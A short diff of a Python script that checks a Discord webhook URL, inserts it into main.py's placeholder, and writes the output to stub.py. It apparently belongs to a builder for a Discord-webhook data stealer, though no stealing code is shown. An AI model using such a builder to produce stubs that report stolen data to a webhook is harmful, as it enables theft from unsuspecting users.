@@ -15,7 +15,7 @@ if not get_hook.startswith("https://discord.com/api/webhooks/"):
 else:
     file = open("main.py", "r")
     sourceCode = file.read()
-    newCode = sourceCode.replace("%WEBHOOK_URL%", get_hook)
+    newCode = sourceCode.replace("%URL%", get_hook)
     with open(r"stub.py", "w") as exela:
         exela.write(newCode)
 
